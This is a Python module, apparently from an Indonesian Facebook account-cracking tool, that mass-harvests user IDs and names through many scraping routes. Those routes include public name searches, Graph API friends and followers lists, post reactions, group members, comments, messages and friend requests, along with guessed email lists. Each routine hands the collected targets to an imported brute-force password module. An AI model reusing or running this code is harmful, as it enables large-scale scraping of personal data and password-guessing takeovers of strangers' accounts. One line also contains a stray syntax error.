###----------[ IMPORT LIBRARY ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from time import sleep
from rich.panel import Panel
from rich import print as prints
from src import login as Login
from src import brute as Brute

###----------[ COLOR FOR PRINT ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ COLOR FOR RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

###----------[ GLOBAL NAME ]---------- ###
ses = requests.Session()

###----------[ APPEND AND MORE ]---------- ###
loop = 0
id,id2,ok,cp = [],[],[],[]
mtd_dev = []
opt = []
idz = []
apk = []
files = []
id_groups = []
data = {}
ugent1, ugent2 = [],[]

###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"

###----------[ CONVERT USERNAME TO ID ]---------- ###
def convert_id(user):
	payload = {"fburl": "https://free.facebook.com/{user}", "check": "Lookup"}
	if "facebook" in user:
		payload = {"fburl": user, "check": "Lookup"}
	url = parser(ses.post("https://lookup-id.com/", data=payload).content,"html.parser")
	data = url.find("span", id="code")
	idt = data.text
	return idt

###----------[ DUMP SEARCH NAME VERSION 1 (LIMIT 100 ID) ]---------- ###
def search_name_v1():
	prints(Panel(f"""{P2}you must enter a search name. You can use a comma (,) as a separator if you want more than 1 name""",width=80,style=f"{color_table}"))
	idt = input(f" {N}input name : ").split(",")
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	for set3 in idt:
		dump_search(f"https://mbasic.facebook.com/public/{set3}?/locale2=ar_AR")
	exit(Brute.setting_password(id))

###----------[ DUMP SEARCH NAME VERSION UNLIMITED ID ]---------- ###
def search_name_v2():
	prints(Panel(f"""{P2}you must enter a search name. You can use a comma (,) as a separator if you want more than 1 name""",width=80,style=f"{color_table}"))
	idt = input(f" {N}input name : ").split(",")
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	common = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	for set1 in idt:
		idz.append(set1)
		for set2 in common:
			idz.append(set2+" "+set1) 
	for set3 in idz:
		dump_search(f"https://mbasic.facebook.com/public/{set3}?/locale2=id_ID")
	exit(Brute.setting_password(id))

###----------[ GET DATA FROM SEARCH NAME ]---------- ###
def dump_search(url):
	try:
		data = parser(ses.get(str(url)).text,'html.parser')
		for z in data.find_all("td"):
			tampung = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
			for uid,name in tampung:
				if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
				elif "<span" in name:name = re.findall("(.*?)\<",str(name))[0]
				if uid+"<=>"+name in id:pass
				else:id.append(uid+"<=>"+name)
				sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
		for x in data.find_all("a",href=True):
			if "Lihat Hasil Selanjutnya" in x.text:
				dump_search(x.get("href"))
	except:
		pass

###----------[ DUMP SEARCH NAME VERSION EMAIL ]---------- ###
def random_email():
	x = 0
	prints(Panel(f"""{P2}
[{color_rich}01{P2}]. dump search name from @gmail.com
[{color_rich}02{P2}]. dump search name from @yahoo.com
[{color_rich}03{P2}]. dump search name from @hotmail.com
[{color_rich}04{P2}]. dump search name from @outlook.com
""",width=80,padding=(0,14),style=f"{color_table}"))
	ask = input(f" {N}choose email : ")
	if ask in["1"]:
		email = "@gmail.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	elif ask in["2"]:
		email = "@yahoo.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	elif ask in["3"]:
		email = "@hotmail.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	elif ask in["4"]:
		email = "@outlook.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	exit(Brute.setting_password(id))

def search_name_v3(cookie):
	prints(Panel(f"""{P2}you must enter a search name. You can use a comma (,) as a separator if you want more than 1 name""",width=80,style=f"{color_table}"))
	idt = input(f" {N}input name : ").split(",")
	for idz in idt:
		get_pencarian_cookie("https://mbasic.facebook.com/search/people/?q={idz}",cookie)
	exit(Brute.setting_password(id))

def get_pencarian_cookie(url,cookie):
	try:
		req = ses.get(url,cookies=cookie)
		data = parser(req.content,"html.parser")
		for z in data.find_all('a',href=True):
			if "<img alt=" in str(z):
				if "home.php" in str(z["href"]):continue
				else:
					try:
						if "profile.php" in z.get("href"):
							uid = z.get("href").split('=')[1].replace("&refid","")
							nama = z.find("img").get("alt").replace(", profile picture","")
							id.append(uid+"<=>"+nama)
						else:
							uid = z.get("href").split('/')[1].replace("?refid=46","")
							nama = z.find("img").get("alt").replace(", profile picture","")
							id.append(uid+"<=>"+nama)
					except:pass
		for x in data.find_all('a',href=True): 
			if "Lihat Hasil Selanjutnya" in x.text:
				get_pencarian_cookie(x["href"],cookie)
	except Exception as e:
		pass

###----------[ DUMP FROM PUBLIC FRIENDS ]---------- ###
def public_friends(token,cookie):
	prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style=f"{color_table}"))
	user = input(f" {N}input target id : ")
	if(re.findall("\w+",user)):
		try:idt = convert_id(user)
		except:idt = user
	try:
		for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name,username).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
			try:
				id.append(i["username"]+"<=>"+i["name"])
			except:
				id.append(i["id"]+"<=>"+i["name"])
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	except KeyError:exit("\n  [!] akun tidak tersedia atau list teman private")
	exit(Brute.setting_password(id))
	
###----------[ DUMP FROM MULTI TARGET ]---------- ###
def multi_target(token,cookie):
	prints(Panel(f"""{P2}input the number of target id, if you want 1 you just enter""",width=80,style=f"{color_table}"))
	try:tanya_total = int(input(f" {N}input total target : "))
	except:tanya_total=1
	prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style=f"{color_table}"))
	for t in range(tanya_total):
		t +=1
		print("")
		user = input(f" {N}input target id {O}{t}{N} : ")
		if(re.findall("\w+",user)):
			try:idt = convert_id(user)
			except:idt = user
		try:
			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name,username).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
				try:
					try:
						uid = (i["username"]+"<=>"+i["name"])
					except:
						uid = (i["id"]+"<=>"+i["name"])
					if uid in id:pass
					else:id.append(uid)
				except:continue
				sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
		except KeyError:print("  [!] akun tidak tersedia atau list teman private")
	exit(Brute.setting_password(id))
	
###----------[ DUMP FROM FOLLOWERS ]---------- ###
def followers(token,cookie):
	prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your followers",width=80,style=f"{color_table}"))
	user = input(f" {N}input target id : ")
	if(re.findall("\w+",user)):
		try:idt = convert_id(user)
		except:idt = user
	try:
		for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,subscribers.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["subscribers"]["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	except KeyError:exit("\n  [!] akun tidak tersedia atau list teman private")
	exit(Brute.setting_password(id))
			
###----------[ DUMP FROM REACTIONS ]---------- ###
def all_reactions(cookie):
	global react_type
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. crack from all reactions  [{color_rich}05{P2}]. crack from haha reactions
[{color_rich}02{P2}]. crack from like reactions [{color_rich}06{P2}]. crack from wow reactions
[{color_rich}03{P2}]. crack from love reactions [{color_rich}07{P2}]. crack from sad reactions
[{color_rich}04{P2}]. crack from angry reactions[{color_rich}08{P2}]. crack from care reactions""",width=80,padding=(0,4),style=f"{color_table}"))
	react = input(f" {N}choose react : ")
	if react in["01","1"]:
		react_type="0"
	elif react in["02","2"]:
		react_type="1"
	elif react in["03","3"]:
		react_type="2"
	elif react in["04","4"]:
		react_type="8"
	elif react in["05","5"]:
		react_type="4"
	elif react in["06","6"]:
		react_type="3"
	elif react in["07","7"]:
		react_type="7"
	elif react in["08","8"]:
		react_type="16"
	prints(Panel(f"""{P2}make sure the post id is public or not private. if private will return empty result""",width=80,style=f"{color_table}"))
	idt = input(f" {N}input id post : ")
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	url = "https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier="+idt
	dump_react(url,cookie)
	exit(Brute.setting_password(id))

###----------[ GET DATA FROM REACTIONS ]---------- ###
def dump_react(url,cookie):
	data = parser(ses.get(url,cookies=cookie,headers=header_grup).text.encode("utf-8"),"html.parser")
	try: 
		for isi in data.find_all('h3'):
			for ids in isi.find_all('a',href=True):
				try:
					if "profile.php" in ids.get("href"):
						uid = ids.get("href").split('=')[1]
						nama = ids.text
						id.append(uid+"<=>"+nama)
					else:
						uid = ids.get("href").split('/')[1]
						nama = ids.text
						id.append(uid+"<=>"+nama)
					sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
				except:continue
		for lanjut in data.find_all("a",href=True):
			if "Lihat Selengkapnya" in lanjut.text:
				dump_react("https://mbasic.facebook.com/"+lanjut.get("href").replace('reaction_type=0','reaction_type='+react_type),cookie)
	except:
		pass

###----------[ MENU DUMP GROUPS ]---------- ###
def group_members(token,cookie):
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. dump from search name groups
[{color_rich}02{P2}]. dump from one groups joined
[{color_rich}03{P2}]. dump from id groups public""",width=80,padding=(0,19),style=f"{color_table}"))
	ask = input(f" {N}input choice : ")
	if ask in["1"]:
		idt = input(f" {N}input name : ")
		url = f"https://mbasic.facebook.com/search/groups/?q={idt}&source=filter&isTrending=0"
		search_name_groups(url,cookie)
		exit(Brute.setting_password(id))
	elif ask in["2"]:
		one_groups_joined(token,cookie)
		exit(Brute.setting_password(id))
	elif ask in["3"]:
		idt = input(f" {N}input id groups : ")
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/groups/"+idt
		dump_grup_no_login(url)
		exit(Brute.setting_password(id))

###----------[ DUMP FROM SEARCH NAME GROUPS ]---------- ###
def search_name_groups(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		inf = re.findall('\<a\ href\=\"https\:\/\/mbasic\.facebook\.com\/groups\/(.*?)\/\?refid\=.*?\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>\<\/div\>\<div\ class\=\".*?\">\<span\>(.*?)<\/span\>',str(data))
		post = re.findall('\<\/span\>\<\/div\>\<div\ class\=\".*?\">(.*?)<\/div\>',str(data))
		n = 0
		for x in inf:
			if "Grup Privat" in x:
				pass
			else:
				n += 1
				id_groups.append(x[0])
				url = parser(ses.get(f"https://mbasic.facebook.com/groups/{x[0]}").text,"html.parser")
				members = re.findall('Anggota<\/a\>\<\/td\>\<td\ class\=\".*?\">\<span\ class\=\".*?\" id\=\".*?\">(.*?)<\/span\>',str(url))[0]
				prints(Panel(f"""{P2}[{n}]\nName Grup : {x[1]}\nID Grup   : {x[0]}\nMembers   : {members}\nType Grup : {x[2]}""",width=80,style=f"{color_table}"))
	except:pass
	ask = input(f" {N}choose number : ")
	try:
		number = id_groups[int(ask)-1]
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/groups/"+number
		dump_grup_no_login(url)
	except Exception as e:
		print(e)
	
###----------[ DUMP FROM ONE GROUPS JOINED ]---------- ###
def one_groups_joined(token,cookie):
	n = 0
	prints(Panel(f"""{P2}Untuk Berhenti Dump Silahkan Tekan Ctrl Lalu C Di Keyboard Anda""",width=80,style=f"{color_table}"))
	try:
		for i in ses.get(f"https://graph.facebook.com/me/groups?access_token={token}",cookies=cookie).json()["data"]:
			name = i["name"]
			uid = i["id"]
			priv = i["privacy"]
			if "OPEN" not in priv:
				pass
			else:
				n +=1
				type = "Grup Publik"
				id_groups.append(uid)
				url = parser(ses.get(f"https://mbasic.facebook.com/groups/{uid}").text,"html.parser")
				members = re.findall('Anggota<\/a\>\<\/td\>\<td\ class\=\".*?\">\<span\ class\=\".*?\" id\=\".*?\">(.*?)<\/span\>',str(url))[0]
				prints(Panel(f"""{P2}[{n}]\nName Grup : {name}\nID Grup   : {uid}\nMembers   : {members}\nType Grup : {type}""",width=80,style=f"{color_table}"))
	except Exception as e:
		print(e)
	ask = input(f" {N}choose number : ")
	try:
		number = id_groups[int(ask)-1]
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/groups/"+number
		dump_grup_no_login(url)
	except Exception as e:
		print(e)

def grup_no_login():
	idt = input(f" {N}input id groups : ")
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	url = "https://mbasic.facebook.com/groups/"+idt
	dump_grup_no_login(url)
	exit(Brute.setting_password(id))
	
###----------[ GET DATA FROM GROUP MEMBERS ]---------- ###
def dump_grup_no_login(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				idz = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if idz+"<=>"+nama in id:pass
				else:id.append(idz+"<=>"+nama)
				sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup_no_login("https://m.facebook.com"+href)
	except Exception as e:
		print(e)

###----------[ DUMP FROM PUBLIC COMMENTS ]---------- ###
def public_comments_v1(cookie):
	prints(Panel(f"""{P2}make sure the post id is public or not private. if private will return empty result""",width=80,style=f"{color_table}"))
	idg = input(f" {N}input id post : ")
	url = "https://mbasic.facebook.com/"+idg
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	get_datacomments(url,cookie)
	exit(Brute.setting_password(id))
	
###----------[ GET DATA FROM PUBLIC COMMENTS ]---------- ###
def get_datacomments(url,cookie):
	urlmain = ses.get(url,cookies=cookie).text.encode("utf-8")
	par = parser(urlmain,'html.parser')
	try:
		for xf in par.find_all('h3'):
			for xx in xf.find_all('a',href=True):
				try:
					if "profile.php" in xx.get("href"):
						z = xx.get("href").split('=')[1]
						x = z.split('&')[0]
						uid = xx.text
						id.append(x+"<=>"+uid)
						sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
				except:pass
		for n in par.find_all("a",href=True):
			if "Lihat komentar lainnya" in n.text:
				get_datacomments("https://mbasic.facebook.com/"+n.get("href"),cookie)
	except:
		pass

###----------[ DUMP FROM PUBLIC COMMENTS ]---------- ###
def public_comments_v2():
	prints(Panel(f"""{P2}make sure the post id is public or not private. if private will return empty result""",width=80,style=f"{color_table}"))
	idg = input(f" {N}input id post : ")
	url = "https://mbasic.facebook.com/"+idg
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	dump_komen_no_login(url)
	exit(Brute.setting_password(id))

def dump_komen_no_login(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):uid = ids.get("href").split('=')[1].replace("&refid","")
			else:uid = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if uid+"<=>"+nama in id:pass
			else:id.append(uid+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			dump_komen_no_login("https://mbasic.facebook.com"+z["href"])

###----------[ DUMP FROM MESSAGE ]---------- ###
def message(token,cookie):
	global my_akun
	url = "https://mbasic.facebook.com/messages"
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	my_akun = json.loads(ses.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie).text)["id"]
	get_message(url,cookie)
	exit(Brute.setting_password(id))
	
###----------[ GET DATA FROM MESSAGE ]---------- ###
def get_message(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for z in data.find_all('a',href=True):
			if '/messages/read/?tid=cid.c' in z['href']:
				if 'Pengguna Facebook' in str(z):
					continue
				else:
					idzx = re.findall('cid\.c\.(.*?)%3A(.*?)&',str(z))
					for idz in list(idzx.pop()):
						try:
							if idz in my_akun:continue
							else:
								id.append(idz+"<=>"+z.text)
								sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
						except:continue
		for x in data.find_all('a',href=True):
			if 'Lihat Pesan Sebelumnya' in x.text:
				get_message("https://mbasic.facebook.com"+x["href"],cookie)
	except:
		pass
		
###----------[ DUMP FROM REQUESTS PAGE ]---------- ###
def requests_page(cookie):
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. dump from friend's suggestion
[{color_rich}02{P2}]. dump from friend request in
[{color_rich}03{P2}]. dump from friend request out""",width=80,padding=(0,19),style=f"{color_table}"))
	ask = input(f" {N}input choice : ")
	if ask in["1"]:
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/friends/center/suggestions"
		get_requestspage(url,cookie)
		exit(Brute.setting_password(id))
	elif ask in["2"]:
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/friends/center/requests"
		get_requestspage(url,cookie)
		exit(Brute.setting_password(id))
	elif ask in["3"]:
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/friends/center/requests/outgoing"
		get_requestspage(url,cookie)
		exit(Brute.setting_password(id))
		
###----------[ GET DATA FROM REQUESTS PAGE ]---------- ###
def get_requestspage(url,cookie):
	try:
		data=parser(ses.get(url,cookies=cookie).text,"html.parser")
		for z in data.find_all('a',href=True):
			if 'hovercard' in z['href']:
				uid = re.search('uid=(.*?)&',z['href']).group(1)
				nm = z.text
				iso = uid+"<=>"+nm
				if iso in id:pass
				else:
					id.append(iso)
					sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
		for x in data.find_all('a',href=True):
			if 'Lihat selengkapnya' in x.text:
				get_requestspage("https://mbasic.facebook.com"+x["href"],cookie)
	except:
		pass
		
###----------[ DUMP FROM FRIENDS FROM FRIENDS ]---------- ###
def friendsfromfriends(token,cookie):
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. dump friends from friends for id new
[{color_rich}02{P2}]. dump friends from friends for id old
[{color_rich}03{P2}]. dump friends from friends for id random""",width=80,padding=(0,14),style=f"{color_table}"))
	pil = input(f" {N}input choice : ")
	if pil in["1","01"]:
		prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style=f"{color_table}"))
		idt = input(f" {N}input target id : ")
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		get_id_new(idt,token,cookie)
		exit(Brute.setting_password(id))
	elif pil in["2","02"]:
		prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style=f"{color_table}"))
		idt = input(f" {N}input target id : ")
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		get_id_old(idt,token,cookie)
		exit(Brute.setting_password(id))
	elif pil in["3","03"]:
		prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style=f"{color_table}"))
		idt = input(f" {N}input target id : ")
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		get_id_random(idt,token,cookie)
		exit(Brute.setting_password(id))
		
def get_id_new(idt,token,cookie):
	try:
		for idz in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
			try:
				for i in ses.get(f"https://graph.facebook.com/{idz['id']}?fields=name,friends.fields(id,name,username).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
					if i["id"][:5] in ["10008"] or i["id"][:5] in ["10007"]:
						if i["username"]+"<=>"+i["name"] in id:
							pass
						else:
							#print(i["id"]+"<=>"+i["name"])
							id.append(i["username"]+"<=>"+i["name"])
					sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
			except:continue
	except:pass

def get_id_old(idt,token,cookie):
	try:
		for idz in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
			try:
				for i in ses.get(f"https://graph.facebook.com/{idz['id']}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
					if len(i["id"]) <= 10:
						if i["id"]+"<=>"+i["name"] in id:
							pass
						else:
							id.append(i["id"]+"<=>"+i["name"])
					sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
			except:continue
	except:pass

def get_id_random(idt,token,cookie):
	try:
		for idz in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
			try:
				for i in ses.get(f"https://graph.facebook.com/{idz['id']}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
					if i["id"]+"<=>"+i["name"] in id:
						pass
					else:
						id.append(i["id"]+"<=>"+i["name"])
					sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
			except:continue
	except:pass
	
def friends_from_search(token,cookie):
	name = input(f" {N}input name : ")
	limit = int(input(f" {N}input limit : "))
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	url = "https://mbasic.facebook.com/public/"+name
	get_friends_from_search(url,token,cookie,limit)
	get_data(token,cookie)
	exit(Brute.setting_password(id))

def get_friends_from_search(url,token,cookie,limit):
	try:
		data=parser(ses.get(url).text,"html.parser")
		for z in data.find_all("td"):
			for ids in z.find_all("a",href=True):
				if "profile.php?id" in ids.get("href"):
					try:
						uid = ids.get("href").split("=")[1]
						if uid in idz:
							pass
						else:
							if len(idz)==limit:break
							else:idz.append(uid)
					except:continue
		for x in data.find_all("a",href=True):
			if "Lihat Hasil Selanjutnya" in x.text:
				url2 = x.get("href")
				get_friends_from_search(url2,token,cookie,limit)
	except:
		pass

def get_data(token,cookie):
	try:
		for idt in idz:
			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
				id.append(i["id"]+"<=>"+i["name"])
				sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	except Exception as e:
		print(e)

def multi_files():
	try:tanya_total = int(input(f" {N}input total files : "))
	except:tanya_total=1
	for t in range(tanya_total):
		t +=1
		print("")G
		try:
			file = input(f" {N}input file location {t} : ")
			read = open(file,"r").readlines()
			for uid in read:
				if uid in id:
					pass
				else:
					id.append(uid)
		except FileNotFoundError:
			prints(Panel(f"""{P2} file not found, please enter the location of the file correctly""",width=80,style=f"{color_table}"))
	exit(Brute.setting_password(id))
